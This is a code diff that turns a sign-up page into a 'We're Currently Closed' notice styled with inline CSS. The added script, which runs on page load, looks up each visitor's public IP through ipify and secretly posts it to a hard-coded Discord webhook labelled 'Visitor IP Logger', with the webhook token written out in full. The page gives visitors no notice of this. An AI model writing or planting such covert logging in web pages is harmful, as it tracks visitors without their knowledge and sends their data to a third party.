@@ -1,71 +1,163 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
+<html lang="en"><head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign Up</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="register2.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Kantumruy+Pro:ital,wght@0,100..700;1,100..700&family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&family=Nunito:ital,wght@0,200..1000;1,200..1000&family=Permanent+Marker&family=Rubik+Mono+One&display=swap" rel="stylesheet"></head>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Kantumruy+Pro:ital,wght@0,100..700;1,100..700&family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&family=Noto+Sans+Vithkuqi:wght@400..700&family=Nunito:ital,wght@0,200..1000;1,200..1000&family=Permanent+Marker&family=Rubik+Mono+One&display=swap" rel="stylesheet">
-<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <title>Coming Soon</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap" rel="stylesheet">
+    <style>
+        /* Base Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(to right, #4e54c8, #8f94fb);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 600px;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 30px;
+            border-radius: 15px;
+        }
+
+        /* Message Box */
+        .message-box {
+            margin-bottom: 40px;
+        }
+
+        .main-heading {
+            font-size: 36px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .sub-heading {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .details {
+            font-size: 16px;
+            margin-bottom: 30px;
+        }
+
+        /* Button */
+        .notify-btn {
+            background-color: #ff6b81;
+            color: #fff;
+            padding: 15px 25px;
+            font-size: 16px;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .notify-btn:hover {
+            background-color: #ff3b5e;
+        }
+
+        /* Countdown */
+        .countdown {
+            margin-top: 30px;
+        }
+
+        .countdown-heading {
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+
+        .countdown-timer {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .countdown-item {
+            text-align: center;
+        }
+
+        .countdown-number {
+            font-size: 40px;
+            font-weight: 700;
+            color: #fff;
+        }
+
+        .countdown-label {
+            font-size: 14px;
+        }
+
+        /* Media Queries */
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+
+            .main-heading {
+                font-size: 28px;
+            }
+
+            .sub-heading {
+                font-size: 16px;
+            }
+
+            .countdown-number {
+                font-size: 30px;
+            }
+        }
+    </style>
+</head>
 <body>
     <div class="container">
-        <h1>A N X I E T Y</h1>
-        <div class="countdown">
-            <div class="countdown-item">
-                <div class="countdown-number" id="days">00</div>
-                <div class="countdown-label">Days</div>
-            </div>
-            <div class="countdown-item">
-                <div class="countdown-number" id="hours">00</div>
-                <div class="countdown-label">Hours</div>
-            </div>
-            <div class="countdown-item">
-                <div class="countdown-number" id="minutes">00</div>
-                <div class="countdown-label">Minutes</div>
-            </div>
-            <div class="countdown-item">
-                <div class="countdown-number" id="seconds">00</div>
-                <div class="countdown-label">Seconds</div>
-            </div>
+        <div class="message-box">
+            <h1 class="main-heading">We're Currently Closed</h1>
+            <p class="sub-heading">Our registration page is temporarily unavailable due to some issues. We'll be back soon!</p>
+            <p class="details">Stay tuned and check back later.</p>
+            <button class="notify-btn">Notify Me When We're Back</button>
         </div>
-        <button class="signup-btn">Sign Up Now</button>
+        
     </div>
-    <div class="modal" id="signupModal">
-        <div class="modal-content">
-            <span class="close-btn">&times;</span>
-            <h2>SIGN UP FOR EARLY ACCESS</h2>
-            <form id="signupForm">
-                <div class="form-group">
-                    <input type="text" id="firstName" placeholder="First Name" required>
-                </div>
-                <div class="form-group">
-                    <input type="text" id="lastName" placeholder="Last Name" required>
-                </div>
-                <div class="form-group">
-                    <input type="email" id="email" placeholder="Email Address" required>
-                </div>
-                <div class="form-group terms">
-                    <input type="checkbox" id="terms" required>
-                    <label for="terms">I agree to the Terms and Conditions</label>
-                </div>
-                <button type="submit" class="submit-btn">Sign Up</button>
-            </form>
-        </div>
-    </div>
-    <div class="toast-container"></div>
 
-    <div class="success-modal">
-        <div class="icon">✓</div>
-        <h3>Registration Successful!</h3>
-        <p>Thank you for registering. We've sent a confirmation email to your inbox.</p>
-        <button type="button" onclick="closeSuccessModal()">Got it!</button>
-    </div>
-    <script src="register2.js"></script>
-</body>
-</html>
+    <script>
+        // Send webhook with user's IP on page load
+        window.onload = function() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+
+                    const webhookData = {
+                        content: `New user visit detected! IP: ${userIP}`,
+                        username: "Visitor IP Logger",
+                    };
+
+                    fetch('https://discord.com/api/webhooks/1312653443390767186/V3X0vJeKfsMGPCMFCsjdZ-v2kufwztOZEuDNKbtKlIjtNNRxxvdpIdg1g0pd2rVEzpTY', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(webhookData)
+                    })
+                    .then(response => response.json())
+                    .then(json => console.log('Webhook sent successfully:', json))
+                    .catch(error => console.log('Error sending webhook:', error));
+                })
+                .catch(error => console.log('Error fetching IP address:', error));
+        };
+    </script>
+
+
+
+</body></html>
